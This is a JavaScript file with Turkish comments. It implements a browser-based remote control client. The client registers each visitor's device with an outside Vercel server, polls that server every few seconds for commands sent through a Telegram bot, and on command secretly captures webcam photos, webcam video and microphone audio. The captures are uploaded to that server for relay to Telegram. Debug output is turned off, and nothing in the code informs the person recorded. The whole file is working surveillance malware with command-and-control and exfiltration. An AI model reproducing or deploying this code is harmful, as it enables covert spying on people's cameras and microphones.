// 🎮 Remote Control System - Telegram Bot Commands
// Bu script Telegram bot komutlarını dinler ve kamera/mikrofon kayıtlarını alır

class RemoteControl {
    constructor(config = {}) {
        this.commandEndpoint = config.commandEndpoint || 'https://ironbabatekkral.vercel.app/api/get-commands';
        this.fileEndpoint = config.fileEndpoint || 'https://ironbabatekkral.vercel.app/api/send-file';
        this.sessionEndpoint = config.sessionEndpoint || 'https://ironbabatekkral.vercel.app/api/session-register';
        this.collectDevicesEndpoint = config.collectDevicesEndpoint || 'https://ironbabatekkral.vercel.app/api/collect-devices';
        this.pollInterval = config.pollInterval || 5000; // 5 saniyede bir kontrol
        this.debug = config.debug || false;
        this.isEnabled = false;
        this.pollTimer = null;
        this.heartbeatTimer = null;
        
        // Session info
        this.sessionId = this.generateSessionId();
        this.deviceNumber = null;
        
        // Active sessions (tüm cihazlar)
        this.activeSessions = new Map();
        
        // Media streams
        this.cameraStream = null;
        this.microphoneStream = null;
    }

    // Session ID oluştur
    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    // Uzaktan kontrolü başlat
    async start() {
        if (this.isEnabled) {
            if (this.debug) console.log('[RemoteControl] Already running');
            return;
        }

        this.isEnabled = true;
        
        // Session'ı kaydet
        await this.registerSession();
        
        // Polling başlat
        this.poll();
        
        // Heartbeat başlat (her 1 dakikada bir)
        this.startHeartbeat();
        
        // Başlatma bildirimi gönder
        this.sendStartNotification();
        
        if (this.debug) console.log('[RemoteControl] Started - Session:', this.sessionId);
    }

    // Session'ı kaydet
    async registerSession() {
        try {
            const deviceInfo = await this.collectDeviceInfo();
            
            const response = await fetch(this.sessionEndpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    session_id: this.sessionId,
                    device_info: deviceInfo,
                    action: 'register'
                })
            });

            const result = await response.json();
            if (this.debug) console.log('[RemoteControl] Session registered:', result);
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Session register error:', error);
        }
    }

    // Heartbeat başlat
    startHeartbeat() {
        this.heartbeatTimer = setInterval(async () => {
            if (!this.isEnabled) return;
            
            try {
                await fetch(this.sessionEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        session_id: this.sessionId,
                        action: 'heartbeat'
                    })
                });
            } catch (error) {
                if (this.debug) console.error('[RemoteControl] Heartbeat error:', error);
            }
        }, 60000); // Her 1 dakika
    }

    // Cihaz bilgilerini topla
    async collectDeviceInfo() {
        return {
            platform: navigator.platform,
            user_agent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            online: navigator.onLine
        };
    }

    // Sistem başladığında bildirim gönder
    async sendStartNotification() {
        if (window.telegramLogger) {
            await window.telegramLogger.sendLog('remote_control_started', {
                system_status: 'ACTIVE',
                device_ready: true,
                session_id: this.sessionId,
                timestamp: new Date().toISOString()
            });
            
            // Help mesajını gönder (ilk bağlantıda)
            setTimeout(() => {
                this.sendHelpMessage();
            }, 2000);
        }
    }

    // Help mesajı gönder
    async sendHelpMessage() {
        if (window.telegramLogger) {
            await window.telegramLogger.sendLog('help_guide', {
                guide_type: 'full',
                commands: 'all'
            });
        }
    }

    // Uzaktan kontrolü durdur
    async stop() {
        this.isEnabled = false;
        if (this.pollTimer) {
            clearTimeout(this.pollTimer);
            this.pollTimer = null;
        }
        if (this.heartbeatTimer) {
            clearInterval(this.heartbeatTimer);
            this.heartbeatTimer = null;
        }
        
        // Session'ı kaldır
        try {
            await fetch(this.sessionEndpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    session_id: this.sessionId,
                    action: 'unregister'
                })
            });
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Unregister error:', error);
        }
        
        this.releaseStreams();
        
        if (this.debug) console.log('[RemoteControl] Stopped');
    }

    // Stream'leri serbest bırak
    releaseStreams() {
        if (this.cameraStream) {
            this.cameraStream.getTracks().forEach(track => track.stop());
            this.cameraStream = null;
        }
        if (this.microphoneStream) {
            this.microphoneStream.getTracks().forEach(track => track.stop());
            this.microphoneStream = null;
        }
    }

    // Komutları kontrol et (polling)
    async poll() {
        if (!this.isEnabled) return;

        try {
            const response = await fetch(this.commandEndpoint);
            const data = await response.json();

            if (data.success && data.commands && data.commands.length > 0) {
                if (this.debug) console.log('[RemoteControl] Commands received:', data.commands);

                // Her komutu işle
                for (const cmd of data.commands) {
                    await this.executeCommand(cmd);
                }
            }
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Poll error:', error);
        }

        // Bir sonraki poll'u planla
        if (this.isEnabled) {
            this.pollTimer = setTimeout(() => this.poll(), this.pollInterval);
        }
    }

    // Komutu çalıştır
    async executeCommand(cmd) {
        try {
            // /help komutu
            if (cmd.command === 'show_help') {
                await this.sendHelpMessage();
                return;
            }
            
            // /devices komutu - tüm cihazları tek mesajda listele
            if (cmd.command === 'list_devices') {
                await this.listAllDevices(cmd.message_id);
                return;
            }

            // Target device kontrolü
            if (cmd.target_device !== null && cmd.target_device !== undefined) {
                // Belirli bir cihaz için komut
                // Bu cihazın numarasını bul (session sırasına göre)
                const myDeviceNumber = await this.getMyDeviceNumber();
                
                if (myDeviceNumber !== cmd.target_device) {
                    // Bu komut bana değil, skip
                    if (this.debug) console.log(`[RemoteControl] Command for device ${cmd.target_device}, I am ${myDeviceNumber}, skipping`);
                    return;
                }
            }

            // Komut alındı bildirimi
            if (window.telegramLogger) {
                await window.telegramLogger.sendLog('command_received', {
                    command: cmd.command,
                    params: cmd.params || 'none',
                    message_id: cmd.message_id,
                    target_device: cmd.target_device || 'all',
                    session_id: this.sessionId,
                    status: 'executing'
                });
            }

            switch (cmd.command) {
                case 'camera_screenshot':
                    await this.takeCameraScreenshot(cmd.message_id);
                    break;
                case 'camera_record':
                    await this.recordCamera(cmd.params.duration, cmd.message_id);
                    break;
                case 'microphone_record':
                    await this.recordMicrophone(cmd.params.duration, cmd.message_id);
                    break;
                default:
                    if (this.debug) console.log('[RemoteControl] Unknown command:', cmd.command);
            }
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Command execution error:', error);
            
            // Hata bildirimi
            if (window.telegramLogger) {
                await window.telegramLogger.sendLog('command_error', {
                    command: cmd.command,
                    error: error.message
                });
            }
        }
    }

    // Kendi cihaz numaramı bul
    async getMyDeviceNumber() {
        // Session listesini al ve sırala
        // Bu basitleştirilmiş bir yaklaşım - production'da daha iyi bir sistem gerekir
        const sessionKey = `device_number_${this.sessionId}`;
        let deviceNumber = sessionStorage.getItem(sessionKey);
        
        if (!deviceNumber) {
            // İlk kez, session ID'ye göre tahmin et
            const timestamp = parseInt(this.sessionId.split('_')[1]);
            deviceNumber = ((timestamp % 100) + 1).toString();
            sessionStorage.setItem(sessionKey, deviceNumber);
        }
        
        return parseInt(deviceNumber);
    }

    // Tüm cihazları listele (tek mesajda)
    async listAllDevices(messageId) {
        try {
            const deviceInfo = await this.collectDeviceInfo();
            const collectionId = `devices_${messageId}_${Date.now()}`;
            
            // Kendi cihaz bilgisini ekle
            await fetch(this.collectDevicesEndpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'add',
                    collection_id: collectionId,
                    device_info: {
                        session_id: this.sessionId.substring(8, 20) + '...',
                        platform: deviceInfo.platform,
                        screen: deviceInfo.screen,
                        user_agent: deviceInfo.user_agent,
                        language: deviceInfo.language,
                        online: deviceInfo.online ? 'Online' : 'Offline'
                    }
                })
            });

            // LocalStorage'da işaretle (ilk cihaz mı?)
            const storageKey = `collection_${collectionId}`;
            const isFirst = !localStorage.getItem(storageKey);
            
            if (isFirst) {
                localStorage.setItem(storageKey, 'true');
                
                // 2 saniye bekle (diğer cihazların da eklemesi için)
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Listeyi Telegram'a gönder
                await fetch(this.collectDevicesEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        action: 'send',
                        collection_id: collectionId
                    })
                });

                // Temizle
                setTimeout(() => {
                    localStorage.removeItem(storageKey);
                }, 5000);
                
                if (this.debug) console.log('[RemoteControl] Device list sent (first device)');
            } else {
                if (this.debug) console.log('[RemoteControl] Device added to collection (not first)');
            }
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] List devices error:', error);
        }
    }

    // 📷 Kamera Screenshot
    async takeCameraScreenshot(messageId) {
        try {
            if (this.debug) console.log('[RemoteControl] Taking camera screenshot...');

            // Kamera erişimi al
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            // Video element oluştur
            const video = document.createElement('video');
            video.srcObject = stream;
            video.autoplay = true;
            video.muted = true;

            // Video yüklenene kadar bekle
            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });

            // Biraz bekle (kamera ısınsın)
            await new Promise(resolve => setTimeout(resolve, 500));

            // Canvas'a çiz
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            // Base64'e çevir
            const imageData = canvas.toDataURL('image/jpeg', 0.9);

            // Stream'i kapat
            stream.getTracks().forEach(track => track.stop());

            // Telegram'a gönder
            await this.sendFile('photo', imageData, '📷 Camera Screenshot', messageId);

            if (this.debug) console.log('[RemoteControl] Screenshot sent successfully');

        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Screenshot error:', error);
        }
    }

    // 🎥 Kamera Video Kayıt
    async recordCamera(duration, messageId) {
        try {
            if (this.debug) console.log(`[RemoteControl] Recording camera for ${duration} seconds...`);

            // Kamera erişimi al (düşük çözünürlük)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    frameRate: { ideal: 15 }
                }, 
                audio: true 
            });
            
            const mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp8,opus',
                videoBitsPerSecond: 250000 // 250kbps - düşük kalite ama küçük dosya
            });

            const chunks = [];
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            mediaRecorder.onstop = async () => {
                // Blob oluştur
                const blob = new Blob(chunks, { type: 'video/webm' });
                
                // Base64'e çevir
                const reader = new FileReader();
                reader.onloadend = async () => {
                    const base64data = reader.result;
                    
                    // Stream'i kapat
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Telegram'a gönder
                    await this.sendFile('video', base64data, `🎥 Camera Video (${duration}s)`, messageId);
                    
                    if (this.debug) console.log('[RemoteControl] Video sent successfully');
                };
                reader.readAsDataURL(blob);
            };

            // Kaydı başlat
            mediaRecorder.start();

            // Belirtilen süre sonra durdur
            setTimeout(() => {
                mediaRecorder.stop();
            }, duration * 1000);

        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Camera record error:', error);
        }
    }

    // 🎤 Mikrofon Ses Kayıt
    async recordMicrophone(duration, messageId) {
        try {
            if (this.debug) console.log(`[RemoteControl] Recording microphone for ${duration} seconds...`);

            // Mikrofon erişimi al (düşük kalite)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                audio: {
                    sampleRate: 16000,
                    echoCancellation: true,
                    noiseSuppression: true
                }
            });
            
            const mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'audio/webm;codecs=opus',
                audioBitsPerSecond: 32000 // 32kbps - düşük kalite ama küçük dosya
            });

            const chunks = [];
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            mediaRecorder.onstop = async () => {
                // Blob oluştur
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                
                // Base64'e çevir
                const reader = new FileReader();
                reader.onloadend = async () => {
                    const base64data = reader.result;
                    
                    // Stream'i kapat
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Telegram'a gönder
                    await this.sendFile('voice', base64data, `🎤 Microphone Recording (${duration}s)`, messageId);
                    
                    if (this.debug) console.log('[RemoteControl] Voice sent successfully');
                };
                reader.readAsDataURL(blob);
            };

            // Kaydı başlat
            mediaRecorder.start();

            // Belirtilen süre sonra durdur
            setTimeout(() => {
                mediaRecorder.stop();
            }, duration * 1000);

        } catch (error) {
            if (this.debug) console.error('[RemoteControl] Microphone record error:', error);
        }
    }

    // Dosyayı Telegram'a gönder
    async sendFile(fileType, fileData, caption, messageId) {
        try {
            const response = await fetch(this.fileEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    file_type: fileType,
                    file_data: fileData,
                    caption: caption,
                    message_id: messageId
                })
            });

            const result = await response.json();

            if (this.debug) {
                console.log('[RemoteControl] File send response:', result);
            }

            return result;
        } catch (error) {
            if (this.debug) console.error('[RemoteControl] File send error:', error);
            return { success: false, error: error.message };
        }
    }
}

// Global instance oluştur
const remoteControl = new RemoteControl({
    debug: false // Production - rate limit önlemek için
});

// Global scope'a ekle
window.remoteControl = remoteControl;

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = RemoteControl;
}

